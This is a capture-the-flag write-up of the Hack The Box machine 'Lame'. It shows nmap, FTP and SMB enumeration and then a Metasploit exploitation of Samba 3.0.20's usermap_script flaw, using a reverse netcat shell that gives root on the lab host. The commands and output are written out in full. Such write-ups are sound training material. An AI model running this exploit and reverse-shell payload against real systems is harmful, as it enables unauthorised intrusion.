
### Lame HTB

### Difficulty: Easy

### IP Address: 10.10.10.3

Nmap Scan:

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ nmap -sCV -A 10.10.10.3 -p21,22,139,445,3632 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 01:02 WAT
Nmap scan report for 10.10.10.3
Host is up (0.27s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-01-19T19:03:24-05:00
|_clock-skew: mean: 2h30m20s, deviation: 3h32m09s, median: 19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.92 seconds
```

Checking ftp for anonymous login which worked

But nothing is really in the ftp directory
```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ ftp 10.10.10.3     
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:mark): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
lsftp> ls -al
229 Entering Extended Passive Mode (|||55652|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> put nmapscan
local: nmapscan remote: nmapscan
229 Entering Extended Passive Mode (|||38021|).
553 Could not create file.
ftp> 
```
Listing shares in the smb anonymously
```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ smbclient -L 10.10.10.3           
Password for [WORKGROUP\mark]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
```

Checking out what each shares we have access to has in it

```
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ smbclient //10.10.10.3/tmp
Password for [WORKGROUP\mark]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Fri Jan 20 01:07:43 2023
  ..                                 DR        0  Sat Oct 31 08:33:58 2020
  .ICE-unix                          DH        0  Fri Jan 20 01:01:47 2023
  vmware-root                        DR        0  Fri Jan 20 01:02:09 2023
  .X11-unix                          DH        0  Fri Jan 20 01:02:12 2023
  .X0-lock                           HR       11  Fri Jan 20 01:02:12 2023
  vgauthsvclog.txt.0                  R     1600  Fri Jan 20 01:01:45 2023
  5574.jsvc_up                        R        0  Fri Jan 20 01:02:50 2023

                7282168 blocks of size 1024. 5386548 blocks available
smb: \> 

```
Doesn't really seem like anything important but I'll get the file to my machine

The other share doesn't give us access to login anonymously
```                                                                                                      
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ smbclient //10.10.10.3/opt
Password for [WORKGROUP\mark]:
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Saving the file in the /tmp share 

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ smbclient //10.10.10.3/tmp
Password for [WORKGROUP\mark]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> get vgauthsvclog.txt.0
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \> 
 ```
 
 The content of the file is just the log for the smb on the vmware nothing of interest there
 
 ```                                                                                                      
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ cat vgauthsvclog.txt.0 
[Jan 19 19:01:44.961] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Jan 19 19:01:44.961] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Jan 19 19:01:44.961] [ message] [VGAuthService] Group 'service'
[Jan 19 19:01:44.961] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Jan 19 19:01:44.961] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Jan 19 19:01:45.524] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Jan 19 19:01:45.524] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Jan 19 19:01:45.524] [ message] [VGAuthService] Group 'service'
[Jan 19 19:01:45.524] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Jan 19 19:01:45.524] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Jan 19 19:01:45.524] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Jan 19 19:01:45.524] [ message] [VGAuthService] INIT SERVICE
[Jan 19 19:01:45.524] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Jan 19 19:01:45.623] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Jan 19 19:01:45.824] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Jan 19 19:01:45.824] [ message] [VGAuthService] BEGIN SERVICE
```
The other service which runs on port 3632 doesn't do much 

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ nc 10.10.10.3 3632                                           
id
whoami
ls -al
```

Firing up metasploit to check for vulnerable version of the services running on the target

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Lame]
└─$ msfconsole
                                                  

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command

[*] Starting persistent handler(s)...
msf6 > 
```

Now i'll search for `samba 3.0.20` since thats the version the smb server uses

```
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
```

Seems worth a trial 

I'll try it out

```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-fra
                                      mework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.220.131  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost tun0
lhost => tun0
msf6 exploit(multi/samba/usermap_script) > 
```

Now I'll run it 

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Command shell session 1 opened (10.10.16.7:4444 -> 10.10.10.3:41858) at 2023-01-20 01:17:03 +0100

id
uid=0(root) gid=0(root)
whoami
root
ls -al
total 101
drwxr-xr-x  21 root root  4096 Oct 31  2020 .
drwxr-xr-x  21 root root  4096 Oct 31  2020 ..
drwxr-xr-x   2 root root  4096 Oct 31  2020 bin
drwxr-xr-x   4 root root  1024 Nov  3  2020 boot
lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  13 root root 13540 Jan 19 19:01 dev
drwxr-xr-x  96 root root  4096 Jan 19 19:01 etc
drwxr-xr-x   6 root root  4096 Mar 14  2017 home
drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx   1 root root    32 Oct 31  2020 initrd.img -> boot/initrd.img-2.6.24-32-server
lrwxrwxrwx   1 root root    32 Oct 31  2020 initrd.img.old -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 Oct 31  2020 lib
drwx------   2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x   4 root root  4096 Mar 16  2010 media
drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
-rw-------   1 root root 17357 Jan 19 19:02 nohup.out
drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x 112 root root     0 Jan 19 19:01 proc
drwxr-xr-x  13 root root  4096 Jan 19 19:02 root
drwxr-xr-x   2 root root  4096 Nov  3  2020 sbin
drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  12 root root     0 Jan 19 19:01 sys
drwxrwxrwt   5 root root  4096 Jan 19 19:17 tmp
drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
drwxr-xr-x  15 root root  4096 May 20  2012 var
lrwxrwxrwx   1 root root    29 Oct 31  2020 vmlinuz -> boot/vmlinuz-2.6.24-32-server
lrwxrwxrwx   1 root root    29 Oct 31  2020 vmlinuz.old -> boot/vmlinuz-2.6.24-16-server
```

From the result we're root already

And we're done xD 


<br> <br>
[Back To Home](../../index.md)
<br>


